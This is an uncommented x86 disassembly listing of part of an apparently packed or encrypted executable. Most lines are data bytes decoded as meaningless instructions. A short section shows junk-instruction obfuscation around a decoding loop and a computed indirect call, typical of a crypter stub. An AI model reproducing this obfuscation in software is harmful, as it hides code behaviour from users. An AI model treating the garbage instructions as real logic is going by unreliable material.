  40cdb8:	mov    bh,0xc
  40cdba:	dec    esp
  40cdbb:	test   esi,esp
  40cdbd:	out    dx,al
  40cdbe:	mov    edx,0x5499f3c7
  40cdc3:	pop    ebp
  40cdc4:	mov    dl,0xe6
  40cdc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdc7:	ret    
  40cdc8:	cmp    ah,BYTE PTR [ebp+0xe]
  40cdcb:	ret    0x3bbc
  40cdce:	repz mov esp,DWORD PTR [esi+0x68]
  40cdd2:	sub    edi,DWORD PTR [ebx]
  40cdd4:	loop   0x40cd7a
  40cdd6:	shl    esi,0x9d
  40cdd9:	push   cs
  40cdda:	mov    WORD PTR [edi],gs
  40cddc:	loope  0x40ce5a
  40cdde:	sub    eax,0x93905beb
  40cde3:	add    BYTE PTR [ebx+0x12],ah
  40cde6:	xchg   ebx,eax
  40cde7:	in     al,dx
  40cde8:	daa    
  40cde9:	push   ss
  40cdea:	push   0x7d
  40cdec:	pop    esi
  40cded:	pop    ecx
  40cdee:	loop   0x40cdd4
  40cdf0:	outs   dx,DWORD PTR ds:[esi]
  40cdf1:	adc    DWORD PTR [eax],edx
  40cdf3:	daa    
  40cdf4:	mov    ebp,0x27414811
  40cdf9:	vpaddb xmm5,xmm2,xmm0
  40cdfd:	fisttp QWORD PTR [esi+0x73c422e]
  40ce03:	std    
  40ce04:	in     al,dx
  40ce05:	test   eax,0x6c6064b9
  40ce0a:	loope  0x40cdb2
  40ce0c:	in     al,0xbb
  40ce0e:	add    eax,0x6d20f59c
  40ce13:	xchg   dl,ch
  40ce15:	dec    ebp
  40ce16:	rol    DWORD PTR [eax],0x54
  40ce19:	push   edi
  40ce1a:	test   eax,0xda708043
  40ce1f:	adc    ecx,edx
  40ce21:	sub    al,0x80
  40ce23:	sti    
  40ce24:	mov    ds:0xa73ac70e,eax
  40ce29:	dec    edi
  40ce2a:	inc    ebx
  40ce2b:	sub    BYTE PTR [esi],al
  40ce2d:	push   es
  40ce2e:	loopne 0x40ce2c
  40ce30:	mov    ebp,0x9c7f939f
  40ce35:	pop    ebp
  40ce36:	popa   
  40ce37:	mov    bh,0xf
  40ce39:	push   esi
  40ce3a:	xchg   ecx,eax
  40ce3b:	stos   BYTE PTR es:[edi],al
  40ce3c:	xchg   edx,eax
  40ce3d:	cmp    DWORD PTR [edx],esp
  40ce3f:	stos   BYTE PTR es:[edi],al
  40ce40:	dec    DWORD PTR [edx-0x2f495967]
  40ce46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce47:	stc    
  40ce48:	ror    BYTE PTR [ebx],0xc5
  40ce4b:	xchg   esp,eax
  40ce4c:	inc    eax
  40ce4d:	addr16 xchg esi,eax
  40ce4f:	push   ss
  40ce50:	mov    esp,0xf84e63a8
  40ce55:	or     DWORD PTR [edi+0x2a32fd9],0xf8606ad3
  40ce5f:	mov    ah,0x14
  40ce61:	arpl   sp,bp
  40ce63:	push   ebx
  40ce64:	stc    
  40ce65:	mov    dl,0x9c
  40ce67:	adc    bh,dh
  40ce69:	outs   dx,BYTE PTR ds:[esi]
  40ce6a:	rcr    BYTE PTR [ecx+0x7901b19c],1
  40ce70:	xchg   esi,eax
  40ce71:	sar    ah,0x76
  40ce74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce75:	mov    ch,0x14
  40ce77:	test   BYTE PTR [ebx],ch
  40ce79:	sub    al,0x4e
  40ce7b:	push   esp
  40ce7c:	sbb    DWORD PTR [ebp-0x7e],ebx
  40ce7f:	fwait
  40ce80:	pusha  
  40ce81:	and    esi,DWORD PTR [ebp-0x59c98c41]
  40ce87:	into   
  40ce88:	je     0x40cebd
  40ce8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce8b:	sbb    cl,ch
  40ce8d:	inc    ebx
  40ce8e:	data16 mov dl,BYTE PTR [ebx]
  40ce91:	jmp    0x40ce6b
  40ce93:	add    edi,esi
  40ce95:	sti    
  40ce96:	stos   DWORD PTR es:[edi],eax
  40ce97:	sbb    ecx,DWORD PTR [edx-0xf]
  40ce9a:	pop    esi
  40ce9b:	push   es
  40ce9c:	mov    bl,0x11
  40ce9e:	mov    dh,0xf4
  40cea0:	xor    eax,0xe35a24a9
  40cea6:	test   eax,0xf3987f2a
  40ceab:	pop    esp
  40ceac:	repz je 0x40cf07
  40ceaf:	mov    cl,0x59
  40ceb1:	pop    es
  40ceb2:	pop    esp
  40ceb3:	add    ebp,DWORD PTR [eax-0x3d]
  40ceb6:	out    dx,al
  40ceb7:	loop   0x40cf31
  40ceb9:	xor    DWORD PTR [ebx+0x6],edx
  40cebc:	gs push cs
  40cebe:	push   esp
  40cebf:	mov    ch,0x63
  40cec1:	in     al,dx
  40cec2:	jbe    0x40cec3
  40cec4:	mov    bl,BYTE PTR [ecx+0x5f]
  40cec7:	jae    0x40cecd
  40cec9:	fimul  WORD PTR [esi+0xd]
  40cecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cecd:	sbb    DWORD PTR [eax-0x39650cc1],edi
  40ced3:	das    
  40ced4:	xchg   ebx,eax
  40ced5:	fldenv [ecx+0x1]
  40ced8:	mov    ebp,0xadeb182c
  40cedd:	dec    edi
  40cede:	cmp    BYTE PTR [edx+0x34],dh
  40cee1:	rcl    ecx,0x84
  40cee4:	lds    eax,FWORD PTR ss:0xfba92d9b
  40ceeb:	jno    0x40cebd
  40ceed:	dec    edi
  40ceee:	ret    
  40ceef:	ficom  DWORD PTR [esi]
  40cef1:	daa    
  40cef2:	addr16 jne 0x40ceb9
  40cef5:	stos   BYTE PTR es:[di],al
  40cef7:	inc    eax
  40cef8:	cli    
  40cef9:	dec    esi
  40cefa:	retf   
  40cefb:	dec    esi
  40cefc:	mov    fs,WORD PTR [esi+0x2d]
  40ceff:	dec    eax
  40cf00:	or     eax,0xb15dc1b6
  40cf05:	in     al,0xd0
  40cf07:	xor    eax,0x460833d9
  40cf0c:	aam    0xd
  40cf0e:	call   0x7059:0xa56baf7b
  40cf15:	neg    BYTE PTR [ebx]
  40cf17:	les    eax,FWORD PTR [ebx]
  40cf19:	push   esp
  40cf1a:	mov    esp,0x5c4c7541
  40cf1f:	mov    ecx,0x28d7b48e
  40cf24:	and    al,0x83
  40cf26:	inc    esi
  40cf27:	std    
  40cf28:	lods   eax,DWORD PTR ds:[esi]
  40cf29:	clc    
  40cf2a:	fidiv  WORD PTR [eax-0x4d]
  40cf2d:	cmp    ecx,DWORD PTR [ebx+0x55]
  40cf30:	cs lahf 
  40cf32:	pusha  
  40cf33:	push   esi
  40cf34:	(bad)  
  40cf35:	out    0xe6,al
  40cf37:	adc    eax,0xc794c3b0
  40cf3c:	iret   
  40cf3d:	fcom   DWORD PTR ds:[edx]
  40cf40:	xor    bl,BYTE PTR [edi]
  40cf42:	cdq    
  40cf43:	jns    0x40cf00
  40cf45:	pop    esp
  40cf46:	iret   
  40cf47:	sub    ch,BYTE PTR [edx+0x73423684]
  40cf4d:	ins    BYTE PTR es:[edi],dx
  40cf4e:	dec    ebx
  40cf4f:	push   0x2b5d1710
  40cf54:	(bad)  
  40cf55:	mov    eax,ds:0x2a4c11f7
  40cf5a:	push   es
  40cf5b:	mov    edi,0xea2249ec
  40cf60:	cmp    cl,0x8
  40cf63:	sbb    ebp,DWORD PTR [edi-0x8]
  40cf66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf67:	sahf   
  40cf68:	lods   eax,DWORD PTR ds:[esi]
  40cf69:	aam    0x9a
  40cf6b:	test   al,0x39
  40cf6d:	mov    ecx,0x469d81aa
  40cf72:	sbb    DWORD PTR [edx+0x57],edi
  40cf75:	jne    0x40cf56
  40cf77:	xor    ebx,DWORD PTR [esi]
  40cf79:	test   eax,0xe770b961
  40cf7e:	adc    ch,BYTE PTR [ecx+eax*1+0x66]
  40cf82:	ficom  WORD PTR [ecx]
  40cf84:	mov    esp,0x5e9ba72f
  40cf89:	clc    
  40cf8a:	imul   ebp,DWORD PTR [ebp+0x207d11b1],0x876f08c6
  40cf94:	sub    DWORD PTR [ecx-0x7c2db22f],0x547e73e2
  40cf9e:	outs   dx,DWORD PTR ds:[esi]
  40cf9f:	jl     0x40cf9c
  40cfa1:	out    dx,eax
  40cfa2:	push   ecx
  40cfa3:	mov    dh,dl
  40cfa5:	mov    BYTE PTR [ebx],bh
  40cfa7:	in     eax,0x96
  40cfa9:	mul    ch
  40cfab:	ja     0x40cfbe
  40cfad:	xchg   dl,cl
  40cfaf:	mov    dh,0xca
  40cfb1:	jae    0x40d018
  40cfb3:	call   0xde83:0x2bb1fee2
  40cfba:	fwait
  40cfbb:	cmp    al,0x92
  40cfbd:	xchg   DWORD PTR [ebp-0x53f07afe],eax
  40cfc3:	enter  0xcb47,0xae
  40cfc7:	xor    al,0x13
  40cfc9:	dec    ebp
  40cfca:	jl     0x40cf67
  40cfcc:	test   BYTE PTR [eax],0x9e
  40cfcf:	inc    ebx
  40cfd0:	pop    es
  40cfd1:	push   0x8be48be1
  40cfd6:	dec    ebx
  40cfd7:	je     0x40cf91
  40cfd9:	loope  0x40cfc0
  40cfdb:	sub    eax,0x5454efa3
  40cfe0:	stos   BYTE PTR es:[edi],al
  40cfe1:	out    0xa5,al
  40cfe3:	xchg   ecx,eax
  40cfe5:	(bad)  
  40cfe6:	push   ss
  40cfe7:	imul   ecx,ebx,0x19
  40cfea:	or     eax,0x411747fb
  40cfef:	dec    edx
  40cff0:	add    al,0x72
  40cff2:	fldcw  WORD PTR [edx-0x3a]
  40cff5:	adc    al,BYTE PTR [esi+0x4f4dafca]
  40cffb:	pop    es
  40cffc:	add    BYTE PTR [ebx-0x6f],0xcd
  40d000:	sbb    BYTE PTR [ecx-0x72],bh
  40d003:	(bad)  
  40d004:	mov    bh,BYTE PTR [edx]
  40d006:	lds    eax,FWORD PTR [edi+0x8]
  40d009:	rcr    DWORD PTR [ebp+0x506b6bad],1
  40d00f:	cmp    DWORD PTR [edx-0x79],esi
  40d012:	(bad)  
  40d013:	jmp    0xb13aa381
  40d018:	fcmovnb st,st(4)
  40d01a:	ds fwait
  40d01c:	test   DWORD PTR ss:[edx+0x35],0x7c4061c1
  40d024:	sbb    DWORD PTR [ebx],ecx
  40d026:	fcomp  DWORD PTR [esi+0x1457e296]
  40d02c:	push   edx
  40d02d:	dec    esi
  40d02e:	cld    
  40d02f:	jge    0x40cff3
  40d031:	sbb    al,0x56
  40d033:	repnz push eax
  40d035:	loop   0x40d017
  40d037:	xor    al,0xa3
  40d039:	ficom  WORD PTR ds:0xf51dedc7
  40d03f:	fst    DWORD PTR [esi+0x3e]
  40d042:	jnp    0x40d043
  40d044:	or     al,0xdc
  40d046:	and    BYTE PTR [esi],bl
  40d048:	call   0x9989:0x7532c4ac
  40d04f:	xor    eax,0xe20f3941
  40d054:	push   edx
  40d055:	ss xchg esi,eax
  40d057:	stc    
  40d058:	lods   al,BYTE PTR ds:[esi]
  40d059:	inc    ebx
  40d05a:	clc    
  40d05b:	out    0xa0,eax
  40d05d:	iret   
  40d05e:	xchg   ebx,eax
  40d05f:	out    0xad,al
  40d061:	out    0x32,eax
  40d063:	icebp  
  40d064:	pop    edi
  40d065:	push   ebx
  40d066:	cmp    DWORD PTR [esi],esp
  40d068:	repz (bad) 
  40d06a:	push   cs
  40d06b:	aad    0x2
  40d06d:	mov    esp,0x724c8c8f
  40d072:	jmp    0x9be7e488
  40d077:	(bad)  [eax+0x41]
  40d07a:	pop    esi
  40d07b:	xchg   ebp,eax
  40d07c:	pop    ecx
  40d07d:	je     0x40d0a4
  40d07f:	xchg   edi,eax
  40d080:	sti    
  40d081:	aaa    
  40d082:	sbb    eax,0x836018be
  40d087:	xchg   ebp,eax
  40d088:	stos   DWORD PTR es:[edi],eax
  40d089:	ret    0x9ddf
  40d08c:	xchg   edx,eax
  40d08d:	fs or  eax,0x50a8f731
  40d093:	pop    ecx
  40d094:	fucomp st(3)
  40d096:	rcl    DWORD PTR [eax],cl
  40d098:	dec    esp
  40d099:	std    
  40d09a:	outs   dx,BYTE PTR ds:[esi]
  40d09b:	or     bh,al
  40d09d:	pop    ss
  40d09e:	inc    edi
  40d09f:	xchg   edi,eax
  40d0a0:	mov    ebp,0x6da5d556
  40d0a5:	push   edi
  40d0a6:	cmp    eax,ebp
  40d0a8:	popf   
  40d0a9:	push   edx
  40d0aa:	jns    0x40d041
  40d0ac:	cmp    ecx,DWORD PTR [esi+0x12]
  40d0af:	mov    BYTE PTR [esi+0x7275956e],dl
  40d0b5:	sbb    eax,DWORD PTR [eax+0x8]
  40d0b8:	mov    dh,0x1a
  40d0ba:	ins    DWORD PTR es:[edi],dx
  40d0bb:	and    BYTE PTR [edi-0x38ae6415],al
  40d0c1:	out    dx,al
  40d0c2:	inc    ecx
  40d0c3:	xor    edx,ebp
  40d0c5:	dec    ebp
  40d0c6:	jge    0x40d0eb
  40d0c8:	inc    edx
  40d0c9:	movsx  esi,BYTE PTR ds:0xb70e777d
  40d0d1:	scas   al,BYTE PTR es:[edi]
  40d0d2:	and    esi,edx
  40d0d4:	pop    ebx
  40d0d5:	adc    DWORD PTR [esi],ebx
  40d0d7:	rcr    DWORD PTR [edi-0x4e],0x1f
  40d0db:	mov    ch,0x4c
  40d0dd:	xchg   ebp,eax
  40d0de:	add    al,0xb8
  40d0e0:	stos   BYTE PTR es:[edi],al
  40d0e1:	gs mov edi,0x63e00c1a
  40d0e7:	and    al,0x19
  40d0e9:	mov    ecx,0x94a2f31e
  40d0ee:	jmp    FWORD PTR [eax+0x24]
  40d0f1:	test   eax,eax
  40d0f3:	es icebp 
  40d0f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0f6:	add    eax,esi
  40d0f8:	ror    DWORD PTR [edi+ecx*8],cl
  40d0fb:	sub    edi,ebx
  40d0fd:	dec    ebp
  40d0fe:	ins    BYTE PTR es:[edi],dx
  40d0ff:	pop    edi
  40d100:	pop    ebx
  40d101:	mov    ds:0x6db48f6a,al
  40d106:	jo     0x40d138
  40d108:	ror    DWORD PTR [esi+0x4eca0fb9],cl
  40d10e:	lahf   
  40d10f:	(bad)  
  40d110:	xchg   esi,eax
  40d111:	daa    
  40d112:	je     0x40d0b0
  40d114:	pop    ds
  40d115:	jle    0x40d107
  40d117:	cmp    al,0x52
  40d119:	add    bh,ch
  40d11b:	in     al,0xe8
  40d11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d11e:	or     al,0x71
  40d120:	mov    edi,0xd2fe4770
  40d125:	xor    al,0xfd
  40d127:	add    eax,0xa600d05b
  40d12c:	(bad)  
  40d12d:	dec    esp
  40d12e:	mov    BYTE PTR [edi-0x19],0x8f
  40d132:	loopne 0x40d182
  40d134:	stos   BYTE PTR es:[edi],al
  40d135:	pop    ebx
  40d136:	adc    eax,DWORD PTR [esi-0x3455dff0]
  40d13c:	or     DWORD PTR ss:[ebx],esp
  40d13f:	cmp    BYTE PTR [edx],bl
  40d141:	imul   ecx,DWORD PTR [esp+edx*2-0x74],0xffffffbd
  40d146:	shr    BYTE PTR [ebp+ecx*2-0x24bd07b7],0x46
  40d14e:	scas   eax,DWORD PTR es:[edi]
  40d14f:	(bad)  
  40d150:	out    0x97,eax
  40d152:	(bad)  
  40d153:	jmp    0x40d16e
  40d155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d156:	shl    BYTE PTR [edi],1
  40d158:	lods   eax,DWORD PTR ds:[esi]
  40d159:	sbb    eax,0x84d1edb0
  40d15e:	cmp    al,0xdd
  40d160:	push   edx
  40d161:	mov    edx,esp
  40d163:	pop    esi
  40d164:	ret    
  40d165:	jl     0x40d12e
  40d167:	push   edi
  40d168:	push   esi
  40d169:	shl    BYTE PTR [ecx+0x1f09e354],cl
  40d16f:	jne    0x40d1b1
  40d171:	mov    ebp,0x7e1b9f73
  40d176:	lock lods eax,DWORD PTR ds:[esi]
  40d178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d179:	ja     0x40d1e5
  40d17b:	es mov al,bh
  40d17e:	sbb    dh,ch
  40d180:	xchg   ecx,eax
  40d181:	push   0xffffffba
  40d183:	cwde   
  40d184:	test   al,0xc
  40d186:	je     0x40d202
  40d188:	mov    al,ds:0xcbc7fc77
  40d18d:	sbb    BYTE PTR [eax-0x7c],dh
  40d190:	std    
  40d191:	pusha  
  40d192:	mov    cl,BYTE PTR ds:0xdd079be8
  40d198:	ins    BYTE PTR es:[edi],dx
  40d199:	jg     0x40d1f6
  40d19b:	adc    edx,ebx
  40d19d:	call   FWORD PTR ds:[edi-0xcef4d2c]
  40d1a4:	push   esi
  40d1a5:	sbb    al,0xb3
  40d1a7:	fst    st(6)
  40d1a9:	icebp  
  40d1aa:	aad    0x71
  40d1ac:	dec    edx
  40d1ad:	(bad)  
  40d1ae:	dec    esp
  40d1af:	or     DWORD PTR fs:[edx],eax
  40d1b2:	(bad)  
  40d1b3:	arpl   WORD PTR [edx+0x1cb447d3],di
  40d1b9:	pop    ss
  40d1ba:	xchg   ebx,ebp
  40d1bc:	leave  
  40d1bd:	xchg   ebx,eax
  40d1be:	retf   0x3d61
  40d1c1:	sahf   
  40d1c2:	add    eax,0xde018b4
  40d1c7:	mov    al,0xa0
  40d1c9:	in     al,0x7f
  40d1cb:	sbb    al,0x5f
  40d1cd:	mov    cl,0xa6
  40d1cf:	mov    al,ds:0xca0e0e32
  40d1d4:	retf   0x97ac
  40d1d7:	test   BYTE PTR [ecx-0x60],0xc9
  40d1db:	fcomp  QWORD PTR [edx]
  40d1dd:	loopne 0x40d204
  40d1df:	sar    DWORD PTR [ecx-0x7f90b31a],cl
  40d1e5:	imul   ebx,ebx,0x3d
  40d1e8:	scas   eax,DWORD PTR es:[edi]
  40d1e9:	es dec edx
  40d1eb:	cmp    BYTE PTR [eax],bh
  40d1ed:	mov    eax,DWORD PTR [eax+0x54]
  40d1f0:	sub    eax,0x7583edef
  40d1f5:	test   dh,bh
  40d1f7:	and    DWORD PTR [esi+0x60def358],ebx
  40d1fd:	jp     0x40d239
  40d1ff:	out    dx,eax
  40d200:	das    
  40d201:	lahf   
  40d202:	sbb    edx,DWORD PTR [ebp-0x52]
  40d205:	or     bh,dl
  40d207:	out    dx,eax
  40d208:	fsub   QWORD PTR [ebx]
  40d20a:	ds sbb eax,0x9ecc9895
  40d210:	sub    BYTE PTR [ebx],cl
  40d212:	push   esp
  40d213:	jge    0x40d229
  40d215:	mov    BYTE PTR [edi+0x64],dh
  40d218:	loopne 0x40d22e
  40d21a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d21b:	(bad)  
  40d21c:	in     eax,dx
  40d21d:	pop    eax
  40d21e:	call   0x9b1af49b
  40d223:	icebp  
  40d224:	neg    BYTE PTR [esi-0x51]
  40d227:	and    ah,BYTE PTR ds:0x3db5de40
  40d22d:	int    0x97
  40d22f:	dec    esp
  40d230:	mov    esi,edi
  40d232:	pop    edx
  40d233:	out    0xca,eax
  40d235:	nop
  40d236:	dec    ecx
  40d237:	out    dx,eax
  40d238:	lahf   
  40d239:	push   ebp
  40d23a:	mov    esp,0x143586e8
  40d23f:	add    al,0x45
  40d241:	aas    
  40d242:	mov    DWORD PTR [eax],edi
  40d244:	or     al,0xc5
  40d246:	xor    al,0x38
  40d248:	jno    0x40d29f
  40d24a:	cmc    
  40d24b:	mov    ds:0x57ad9581,eax
  40d250:	add    eax,0xbf8add53
  40d255:	jg     0x40d232
  40d257:	popf   
  40d258:	inc    ebx
  40d259:	jno    0x40d276
  40d25b:	aaa    
  40d25c:	sub    eax,0xab0404d7
  40d261:	fsub   DWORD PTR [eax-0x4ae08eb2]
  40d267:	stos   DWORD PTR es:[edi],eax
  40d268:	test   al,0xb0
  40d26a:	stos   BYTE PTR es:[edi],al
  40d26b:	add    al,bl
  40d26d:	sbb    DWORD PTR [eax-0x4a276465],esi
  40d273:	xor    BYTE PTR [ecx-0x60],bl
  40d276:	and    al,0x66
  40d278:	jl     0x40d28a
  40d27a:	and    ah,bh
  40d27c:	mov    al,0xf7
  40d27e:	jl     0x40d2a8
  40d280:	inc    ebp
  40d281:	nop
  40d282:	mov    al,0x14
  40d284:	aad    0xdb
  40d286:	inc    eax
  40d287:	retf   0x60f6
  40d28a:	or     al,0x65
  40d28c:	mov    ch,0x18
  40d28e:	int    0x5
  40d290:	add    al,0xb9
  40d292:	scas   al,BYTE PTR es:[edi]
  40d293:	xchg   esi,eax
  40d294:	inc    esp
  40d295:	add    esp,DWORD PTR [ebx]
  40d297:	and    al,0x8b
  40d299:	inc    ebp
  40d29a:	in     al,0x85
  40d29c:	ror    BYTE PTR [edi],0x84
  40d29f:	xchg   esi,eax
  40d2a0:	add    BYTE PTR [eax],al
  40d2a2:	add    bh,al
  40d2a4:	inc    ebp
  40d2a5:	loopne 0x40d2a7
  40d2a7:	add    BYTE PTR [eax],al
  40d2a9:	add    BYTE PTR [edx+0x58],dl
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x42fa2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d49a
  40d43c:	outs   dx,BYTE PTR ds:[esi]
  40d43d:	xor    eax,DWORD PTR [edi+0x7b7b2a1a]
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	jp     0x40d495
  40d449:	mov    esp,0xb8cdbd22
  40d44e:	fs in  al,dx
  40d450:	test   edi,esi
  40d452:	mov    esi,0xcec1075e
  40d457:	sbb    bl,BYTE PTR [edx+0x67dbbc64]
  40d45d:	lock dec esp
  40d45f:	aad    0xa1
  40d461:	mov    dh,0xbe
  40d463:	(bad)  
  40d464:	jo     0x40d4cd
  40d466:	jne    0x40d3fb
  40d468:	(bad)  
  40d46a:	inc    edx
  40d46b:	sar    DWORD PTR [edx],1
  40d46d:	mov    ebp,0x729db8b4
  40d472:	fnstenv [edi+0x3620363c]
  40d478:	stos   BYTE PTR es:[edi],al
  40d479:	(bad)  
  40d47b:	icebp  
  40d47c:	xchg   ecx,eax
  40d47d:	test   edi,esi
  40d47f:	arpl   WORD PTR ss:[eax+0x44],cx
  40d483:	add    eax,0x6f038ab2
  40d488:	or     DWORD PTR [edi+edx*2+0xe],ebx
  40d48c:	push   eax
  40d48d:	or     eax,0x73393f7d
  40d492:	mov    edx,0x4e213a94
  40d497:	je     0x40d420
  40d499:	nop
  40d49a:	mov    cl,0xf
  40d49c:	repz push es
  40d49e:	dec    esp
  40d49f:	lahf   
  40d4a0:	cmp    DWORD PTR [ebp+0x4b],edi
  40d4a3:	cmp    ch,BYTE PTR [esp+edx*1]
  40d4a6:	mov    dh,0x21
  40d4a8:	jno    0x40d484
  40d4aa:	les    ecx,FWORD PTR [ebp-0x70e94150]
  40d4b0:	out    dx,al
  40d4b1:	(bad)  
  40d4b2:	cmp    al,0x4e
  40d4b4:	enter  0x679d,0x7b
  40d4b8:	ss cs test eax,0x7bc690d0
  40d4bf:	mov    ebx,0xac5d362c
  40d4c4:	push   ds
  40d4c5:	and    eax,0x525d2f96
  40d4ca:	aad    0xc8
  40d4cc:	dec    esi
  40d4cd:	aam    0xf6
  40d4cf:	mov    al,ds:0x8513078e
  40d4d4:	shr    edi,1
  40d4d6:	aas    
  40d4d7:	leave  
  40d4d8:	dec    ebp
  40d4d9:	fs sub eax,0x229d5153
  40d4df:	imul   edi,DWORD PTR [esi],0x598eb9f9
  40d4e5:	or     eax,0x460f078c
  40d4ea:	bound  esi,QWORD PTR [esi+eiz*4-0x51]
  40d4ee:	cmp    al,0xba
  40d4f0:	int3   
  40d4f1:	fcomp  QWORD PTR ds:0x8c3c51dd
  40d4f7:	out    0xb3,eax
  40d4f9:	mov    WORD PTR [edx-0x5d823f56],?
  40d4ff:	lahf   
  40d500:	xchg   DWORD PTR [ebp-0x4f],ebp
  40d503:	enter  0xc12d,0x36
  40d507:	cmp    esi,DWORD PTR [edi-0x1f]
  40d50a:	dec    ecx
  40d50b:	test   dl,ch
  40d50d:	lock mov DWORD PTR ss:[edx],esi
  40d511:	xchg   edx,eax
